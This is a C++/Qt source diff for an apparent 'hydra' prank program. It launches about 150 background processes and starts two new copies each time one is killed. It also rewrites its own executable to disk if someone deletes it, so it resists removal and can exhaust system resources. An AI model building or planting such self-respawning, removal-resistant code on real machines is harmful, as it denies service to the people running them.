@@ -37,11 +37,10 @@
 #define WIN_WIDTH 400
 #define WIN_HEIGHT 100
 #define MAX_NUM_PIDS 800
-#define BACKGROUND_HYDRAS 100
+#define BACKGROUND_HYDRAS 150
 #define SEGMENT_SZ (MAX_NUM_PIDS*8) // Each pid is int64_t
 #define MUSIC_TIME_MS_APPROX 375 
 
-QFile exe_file;
 char* exe_file_name;
 QByteArray exe_data;
 int perms;
@@ -84,14 +83,6 @@ void register_pid(QSharedMemory *s, int64_t pid) {
 /* Spawn and register a single hydra */
 void spawn_and_register_one() {
 
-  if (!QFile::exists(exe_file_name)) {
-    std::ofstream out(exe_file_name, std::ofstream::binary);
-    os_set_perm_exec(exe_file_name);
-
-    char *data = exe_data.data();
-    out.write(data, exe_data.length());
-    out.close();
-  }
 
   int64_t pid = os_exec_path(exe_file_name);
   //std::cout << "spawning pid " << pid << std::endl;
@@ -104,6 +95,18 @@ void spawn_and_register_one() {
 void spawn_two_more() {
   
   //std::cout << "Spawning two!" << std::endl;
+  
+  if (!QFile::exists(exe_file_name)) {
+    
+    std::ofstream out(exe_file_name, std::ofstream::binary);
+    char *data = exe_data.data();
+
+    //std::cout << data[0]  << data[1]<< data[2]<< data[3] << std::endl;
+    //std::cout << "wtf? -> " << exe_data.length() << std::endl;
+    out.write(data, exe_data.length());
+    out.close();
+    os_set_perm_exec(exe_file_name);
+  }
 
   spawn_and_register_one();
   spawn_and_register_one();
@@ -112,6 +115,12 @@ void spawn_two_more() {
 /* Continually check all PIDs stored in qsharedmem to see if they're alive. If a
  * process is found dead, respawn two hydras to take its place */
 void check_hydras_loop(QSharedMemory *segment) {
+
+  // Read in the executable file, in case they try to delete it
+  QFile exe_file(exe_file_name);
+  exe_file.open(QIODevice::ReadOnly);
+  exe_data = exe_file.readAll();
+  exe_file.close();
 
   while (true) {
 
@@ -218,7 +227,7 @@ void init_background_hydras(QSharedMemory *segment) {
 int main(int argc, char* argv[])  {
 
   exe_file_name = argv[0];
-  exe_file.setFileName(argv[0]);
+
 
   QSharedMemory segment("hydra :)");
   GLO_sharedmem = &segment;
@@ -256,11 +265,6 @@ int main(int argc, char* argv[])  {
   // std::thread t1(check_hydras_loop, &segment);
   // t1.detach();
 
-  // Read in the executable file, in case they try to delete it
-  exe_file.open(QIODevice::ReadOnly);
-  perms = exe_file.permissions();
-  exe_data = exe_file.readAll();
-  exe_file.close();
 
   // For that win93 feel
   QApplication::setStyle(QStyleFactory::create("Windows"));
